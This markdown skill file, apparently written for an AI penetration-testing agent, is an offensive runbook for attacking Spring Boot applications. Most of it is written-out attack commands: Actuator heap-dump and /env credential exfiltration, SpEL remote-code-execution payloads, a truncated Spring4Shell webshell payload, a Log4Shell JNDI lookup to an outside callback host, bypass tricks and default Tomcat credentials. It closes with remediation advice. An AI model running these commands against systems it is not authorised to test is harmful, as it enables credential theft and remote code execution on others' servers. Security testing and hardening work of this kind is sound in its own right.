---
name: spring-boot
description: Spring Boot — Actuator exposure, Spring Security RBAC gaps, SpEL injection, Spring4Shell, Jackson polymorphic
triggers: [spring, spring boot, actuator, /actuator, springframework, spring security, jackson, spring4shell, log4shell]
---

# Spring Boot Security

Spring Boot's strength is auto-configuration; its weakness is that the same auto-config exposes operational surface (Actuator endpoints) and security defaults that flip on the wrong setting (Spring Security permitAll on /actuator/* when developers think it's locked). High-impact bugs: Actuator over-exposure, Spring Security misconfiguration, SpEL injection, Jackson polymorphic deserialization (multiple CVEs), Spring4Shell (CVE-2022-22965), and Log4Shell (CVE-2021-44228 — Spring apps with log4j 2 affected).

## Attack Surface

### Spring Boot Actuator
- `/actuator/*` — operational endpoints (health, metrics, env, beans, mappings, jolokia)
- Spring Boot 1.x: most endpoints exposed by default; Spring Boot 2+: only `/actuator/health` + `/actuator/info` exposed; others need explicit config
- High-value endpoints:
  - `/actuator/env` — all environment variables incl. secrets
  - `/actuator/configprops` — Spring config including DB creds
  - `/actuator/beans` — full bean inventory
  - `/actuator/mappings` — route map
  - `/actuator/jolokia` — JMX over HTTP → RCE
  - `/actuator/heapdump` — process memory dump (secrets in plaintext)
  - `/actuator/threaddump` — call stacks (info-leak)
  - `/actuator/loggers` — runtime log-level changes; some versions allow log-config RCE

### Spring Security misconfig
- `.permitAll()` on a path that should be authenticated
- Antmatcher ordering: `.antMatchers("/admin/**").hasRole("ADMIN")` AFTER `.antMatchers("/**").permitAll()` → admin paths permitAll'd
- `httpBasic()` without HTTPS → cred sniffing
- CSRF disabled (`.csrf().disable()`) globally for SPA convenience → state-change CSRF

### SpEL (Spring Expression Language) injection
- `@Value("#{...}")` with user input → arbitrary SpEL evaluation
- `ExpressionParser.parseExpression(user_input).getValue()` → instant RCE
- `Pre/PostFilter` SpEL with user-controlled expressions

### Spring4Shell (CVE-2022-22965)
- Spring MVC binding via `class.module.classLoader.resources.context...` chain
- Affects Spring Framework 5.3.0–5.3.17, 5.2.0–5.2.19
- Disable affected versions; patches available

### Jackson polymorphic deserialization
- `@JsonTypeInfo(use = Id.CLASS)` + user-controlled JSON → instantiate arbitrary class
- Pre-2.10: ENABLE_DEFAULT_TYPING leaves the class hierarchy open
- Bug: even on 2.10+, `BasicPolymorphicTypeValidator` misconfigured (allows broad packages) = exploitable
- See deserialization.md for gadget chains

### Spring Cloud / Eureka discovery
- Eureka client endpoints often unauth in dev
- `/eureka/apps` reveals service inventory
- `/eureka/apps/<APP>` → instance addresses

## Detection Channels

### Fingerprint Spring Boot
```bash
# Banner
curl -s 'https://<TARGET>/' | grep -iE 'spring|tomcat'

# Default error page
curl -s 'https://<TARGET>/nonexistent' | grep -i 'Whitelabel Error Page'
# "Whitelabel Error Page" = Spring Boot default
```

### Actuator discovery
```bash
# Check default and common alternate paths
PATHS=(
  /actuator
  /actuator/env /actuator/configprops /actuator/beans /actuator/mappings
  /actuator/heapdump /actuator/threaddump /actuator/loggers
  /actuator/health /actuator/info /actuator/metrics
  /actuator/jolokia /actuator/hystrix.stream /actuator/trace
  /management /admin
)

for path in "${PATHS[@]}"; do
  STATUS=$(curl -s -o /dev/null -w '%{http_code}' "https://<TARGET>${path}")
  [[ "$STATUS" == "200" ]] && echo "${path}: 200"
done
```

### Heap dump exfil (when reachable)
```bash
# Pull the heap dump — gigabytes; sensitive secrets inside
curl -o /tmp/heap.hprof 'https://<TARGET>/actuator/heapdump'

# Grep for credentials in the dump
strings /tmp/heap.hprof | grep -iE 'password|api[_-]?key|secret|token' | head
```

### SpEL injection probe
```bash
# Any user-input field that ends up in @Value or SpEL parser
curl 'https://<TARGET>/eval?expr=T(java.lang.Runtime).getRuntime().exec("id")'

# Or in form fields
curl -X POST 'https://<TARGET>/form' \
  -d 'name=#{T(java.lang.Runtime).getRuntime().exec("id")}'
```

### Spring4Shell probe
```bash
# Affected: Spring 5.3.0-5.3.17, 5.2.0-5.2.19
# Probe payload (truncated PoC):
curl -X POST 'https://<TARGET>/' \
  --data-urlencode 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20...'

# Real probe needs the canonical CVE-2022-22965 PoC; ~150 char payload
# Detection: HTTP 200 with empty body + the server writes a webshell to disk
```

## Operational Runbook

### Step 1 — fingerprint + Actuator sweep
```bash
# Hit each actuator endpoint
for path in env configprops beans mappings heapdump threaddump jolokia health info; do
  RESPONSE=$(curl -s "https://<TARGET>/actuator/${path}")
  if echo "$RESPONSE" | grep -qE '"applicationName"|"propertySources"|"contexts"'; then
    echo "ACCESSIBLE: /actuator/${path}"
    echo "$RESPONSE" | head -3
  fi
done
```

### Step 2 — /env exfil
```bash
# Pull every env var + Spring config
curl -s 'https://<TARGET>/actuator/env' | jq '.propertySources[] | select(.name | contains("system") or contains("application")) | .properties | to_entries[] | "\(.key)=\(.value.value)"' | grep -iE 'password|key|secret|token|url|jdbc'
```

### Step 3 — /jolokia → JMX RCE
```bash
# Jolokia exposes JMX over HTTP — instant RCE in many configurations
curl -s 'https://<TARGET>/actuator/jolokia/list' | jq

# Exploit chain: invoke a JMX MBean that loads a remote MBean over RMI
# Classic CVE-2020-15036 / Jolokia LFI / RMI-class-load
```

### Step 4 — heap dump → secret enumeration
```bash
# Pull + grep
curl -o heap.hprof 'https://<TARGET>/actuator/heapdump'
strings heap.hprof | grep -aE '[A-Za-z0-9+/]{40,}={0,2}' | head -100  # long base64-ish strings
strings heap.hprof | grep -aiE 'spring.datasource.password|spring.datasource.url'
```

### Step 5 — SpEL on form fields
```bash
# Spring's @Valid annotations sometimes evaluate SpEL on the validation message
curl -X POST 'https://<TARGET>/form' \
  -d "field1=#{7*7}"

# If response shows "49" → SpEL active
```

### Step 6 — Spring4Shell + Log4Shell quick check
```bash
# Log4Shell — any input that hits log4j 2.x with format-msg-nolookups disabled
curl -A '${jndi:ldap://oast.fun/log4shell}' 'https://<TARGET>/'
# Watch OAST for the lookup

# Spring4Shell — full PoC requires Tomcat + Spring + JDK 9+
# Strix's scan_nuclei_templates covers both via community templates
```

## Specific Vulnerability Classes

### @PreAuthorize SpEL evaluation
- `@PreAuthorize("#user.id == authentication.principal.id")` — SpEL evaluated server-side
- If user-controlled string flows into a PreAuthorize annotation builder: SpEL injection

### Hibernate `@Query` HQL injection
- `@Query("SELECT u FROM User u WHERE u.name = ?1")` — parameterised, safe
- `@Query("SELECT u FROM User u WHERE u.name = '" + name + "'")` — string concat → HQL injection

### Tomcat ROOT context vs Spring servlet path
- Default servlet path: `/`
- Bug: app deployed under `/app` but Tomcat manager at `/`; if `/manager/html` reachable + default creds (`tomcat:tomcat`) = WAR deployment RCE

### Eureka registration spoofing
- Service registration via POST without auth
- Attacker registers a malicious service; downstream clients call it

### Spring Boot DevTools enabled in prod
- `spring-boot-devtools` dependency leaves a backdoor remote-debug port
- LiveReload server on `35729` — sometimes exposed

## Bypass Techniques

- **`/actuator/env` redacts secret values** — but `?showAll=true` query, or pre-2.6 versions, return them in plaintext.
- **Actuator path remapping**: `management.endpoints.web.base-path=/manage` — defenders move it; predictable patterns: `/manage`, `/admin`, `/internal`.
- **Jolokia disabled but `/actuator/jmx/*` enabled** — different code path; check both.
- **CORS preflight to Actuator** — some Actuator endpoints accept OPTIONS without auth; can leak which endpoints exist.

## Validation

1. Actuator endpoint reachable: 200 response with expected JSON structure.
2. /env contains plaintext secret values.
3. Heap dump downloadable + contains grep-able secrets.
4. SpEL eval: math probe returns evaluated result.
5. Spring4Shell PoC writes a file or executes a command.

## False Positives

- Actuator behind a separate management port (`management.server.port=8081`) that's internal-only — confirm the perimeter.
- /env redacted via `management.endpoints.env.keys-to-sanitize` — values are `******`. Still concerning (presence of secret keys) but lower severity.
- Spring Boot fingerprint without Actuator exposure — no specific finding.

## Impact

- Direct DB / API credential exfil via /env.
- Process memory dump → bulk secret enumeration.
- RCE via Jolokia / SpEL / Spring4Shell / deserialization.
- Lateral movement via Eureka service-mesh spoofing.

## Remediation

1. **Spring Boot 2.x Actuator** — only `/actuator/health` + `/actuator/info` exposed; others require explicit `management.endpoints.web.exposure.include=`.
2. **`management.server.port=`** to a different port + bind to `localhost` only.
3. **Spring Security on Actuator**: `.requestMatchers("/actuator/**").hasRole("ADMIN")`.
4. **SpEL never with user input**: prefer parameterised queries; avoid `@Value` with dynamic args.
5. **Jackson `BasicPolymorphicTypeValidator`** allow-list configured strictly.
6. **DevTools dependency removed in production** builds.
7. **log4j 2 ≥ 2.17.1** for Log4Shell.

## Pro Tips

1. The single most-common Spring Boot finding: `/actuator/env` exposed in production. Always probe.
2. Heap dumps are gigabyte-scale but `strings` + grep finds creds in seconds.
3. Jolokia exposes the full JMX API over HTTP — frequently the highest-impact Actuator endpoint when reachable.
4. Custom `management.server.port` (different port) is the common "we hid it" defence; port scan with naabu reveals.
5. Spring Boot's "Whitelabel Error Page" fingerprint is the canonical confirmation; defenders strip it via custom error handlers but the version banner often leaks elsewhere.

## Summary

Spring Boot exposure is Actuator + Spring Security misconfiguration + canonical Java deserialization / SpEL classes. The auto-configuration that makes development fast also exposes operational endpoints by default. Audit Actuator path-by-path; never trust default-permit on management endpoints.
